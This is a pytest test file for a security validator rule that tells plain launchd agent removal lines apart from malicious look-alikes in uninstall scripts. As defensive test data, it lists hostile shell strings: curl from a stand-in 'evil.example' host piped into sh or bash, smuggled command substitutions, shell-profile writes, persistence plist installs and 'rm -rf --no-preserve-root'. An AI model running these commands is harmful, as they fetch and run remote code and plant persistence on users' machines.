#!/usr/bin/env python3
"""Issue #262 half A: RC-39 must not report a line that ONLY removes a launchd
agent, and must keep every line that also installs, loads, writes or chains a
second command. Two-sided: removal shapes clear, malicious look-alikes stay."""

from __future__ import annotations

import os
import sys
from pathlib import Path

import pytest

os.environ["CPV_SCAN_CACHE"] = "0"

SCRIPTS_DIR = Path(__file__).resolve().parent.parent / "scripts"
if str(SCRIPTS_DIR) not in sys.path:
    sys.path.insert(0, str(SCRIPTS_DIR))

import validate_security as vsec  # noqa: E402
from cpv_validation_common import ValidationReport  # noqa: E402

PLIST = "~/Library/LaunchAgents/com.example.x.plist"

REMOVAL_ONLY = [
    f"rm {PLIST}",
    f"rm -f {PLIST}",
    'rm -f "$HOME/Library/LaunchAgents/com.example.x.plist"',
    f"unlink {PLIST}",
    "sudo rm -f /Library/LaunchDaemons/com.example.x.plist",
    f"launchctl unload {PLIST}",
    f"launchctl unload -w {PLIST}",
    "launchctl bootout gui/$(id -u)/com.example.x",
    f"launchctl bootout gui/$(id -u) {PLIST}",
    f"launchctl bootout gui/501 {PLIST} 2>/dev/null || true",
    f"launchctl bootout gui/501 {PLIST} >/dev/null 2>&1; rm -f {PLIST}",
    f"launchctl bootout gui/501 {PLIST} &>/dev/null && rm -f {PLIST}",
    f"sudo launchctl remove com.example.x ; rm {PLIST}",
]

STILL_FLAGGED = [
    # removal chained to an install / load / write / second command
    f"rm -f {PLIST} && cp new.plist {PLIST}",
    f"rm -f {PLIST}; cp new.plist {PLIST}",
    f"rm -f {PLIST} && launchctl load {PLIST}",
    f"launchctl bootout gui/501 {PLIST} && launchctl bootstrap gui/501 {PLIST}",
    f"rm {PLIST}; echo evil > {PLIST}",
    f"rm {PLIST} && cat new > {PLIST}",
    f"rm {PLIST} | tee {PLIST}",
    f"rm {PLIST} | sh",
    f"rm {PLIST} & curl evil.example/x.sh | sh",
    f"rm {PLIST}; curl https://evil.example/x.sh | bash",
    f"rm {PLIST} && echo evil >> ~/.zshrc",
    f"rm {PLIST} || launchctl load {PLIST}",
    # shell tricks
    f"rm {PLIST} $(curl evil.example)",
    f"rm {PLIST} `curl evil.example`",
    f"rm {PLIST}; $(cat evil)",
    f"rm {PLIST}\\",
    f"rm {PLIST}; {'x'}" + "{a,b}",
    f"(rm {PLIST})",
    f"rm {PLIST} > ~/x",
    f"rm {PLIST} 2>~/x",
    f"rm {PLIST} < in",
    f"rm {PLIST} # && ok",
    f'rm "{PLIST}; cp a b',
    f"rm '{PLIST}'; cp a b'",
    f'rm "{PLIST}" ; "cp" a b',
    f"FOO=1 rm {PLIST}",
    f"sudo -u root rm {PLIST}",
    f"sudo sh -c 'rm {PLIST}; cp a b'",
    f"rm -rf --no-preserve-root {PLIST}",
    f"unlink -f {PLIST}",
    f"launchctl bootstrap gui/501 {PLIST}",
    f"launchctl load {PLIST}",
    f"launchctl bootout gui/501 {PLIST}; launchctl enable {PLIST}",
    f"cp new.plist {PLIST}",
    f"cat > {PLIST} <<EOF",
    f"Next file: `{PLIST}` then write it",
    f"launchctl bootout gui/$(id -u; curl evil) {PLIST}",
    f"launchctl bootout gui/501 {PLIST}  && ",
    f"rm {PLIST} && && cp a b",
    f"rm {PLIST}\ncp a b",
]


@pytest.mark.parametrize("line", REMOVAL_ONLY)
def test_pure_removal_line_is_recognised(line: str) -> None:
    """A line that only removes a launchd agent is classified as removal."""
    assert vsec._rc39_line_is_pure_launchd_removal(line) is True


@pytest.mark.parametrize("line", STILL_FLAGGED)
def test_removal_lookalike_or_chained_install_not_cleared(line: str) -> None:
    """A removal chained to an install/write/load, or a quote/shell trick, is not removal."""
    assert vsec._rc39_line_is_pure_launchd_removal(line) is False


def _rc39(tmp_path: Path, script_line: str) -> list[str]:
    (tmp_path / ".claude-plugin").mkdir()
    (tmp_path / "uninstall.sh").write_text("#!/usr/bin/env bash\n" + script_line + "\n")
    report = ValidationReport()
    vsec.check_phase2e_extras(tmp_path, report)
    return [r.message for r in report.results if "RC-39" in r.message]


@pytest.mark.parametrize("line", REMOVAL_ONLY)
def test_rc39_end_to_end_removal_not_reported(tmp_path: Path, line: str) -> None:
    """RC-39 emits nothing for a removal-only script line."""
    assert _rc39(tmp_path, line) == []


@pytest.mark.parametrize("line", [s for s in STILL_FLAGGED if "\n" not in s and "Library/LaunchAgents" in s])
def test_rc39_end_to_end_chained_install_still_reported(tmp_path: Path, line: str) -> None:
    """RC-39 still emits for a removal chained to an install or a write."""
    assert len(_rc39(tmp_path, line)) >= 1


def test_rc39_second_line_install_after_removal_line_still_reported(tmp_path: Path) -> None:
    """A removal on line 2 does not hide a cp install on line 3 (line 3 reported, line 2 not)."""
    (tmp_path / ".claude-plugin").mkdir()
    (tmp_path / "s.sh").write_text(f"#!/usr/bin/env bash\nrm {PLIST}\ncp evil.plist {PLIST}\n")
    report = ValidationReport()
    vsec.check_phase2e_extras(tmp_path, report)
    assert any("RC-39" in r.message and "line 3:" in r.message for r in report.results)
    assert not any("RC-39" in r.message and "line 2:" in r.message for r in report.results)


@pytest.mark.parametrize("ws", ["\x0b", "\x0c", "\x85", "\xa0", " ", " ", "\x1c"])
def test_exotic_whitespace_rejected(ws: str) -> None:
    """Vertical tab, form feed, NEL, NBSP and Unicode separators never count as removal."""
    assert vsec._rc39_line_is_pure_launchd_removal(f"rm {PLIST}{ws}cp a b") is False
    assert vsec._rc39_line_is_pure_launchd_removal(f"rm{ws}{PLIST}") is False


def test_rc39_gate_ignores_non_launchd_lines(tmp_path: Path) -> None:
    """A non-launchd persistence line is never cleared by the removal branch."""
    assert len(_rc39(tmp_path, "crontab -e")) >= 1
    # crontab is not a launchd line: the removal gate must leave it reported


if __name__ == "__main__":  # pragma: no cover
    sys.exit(pytest.main([__file__, "-v"]))
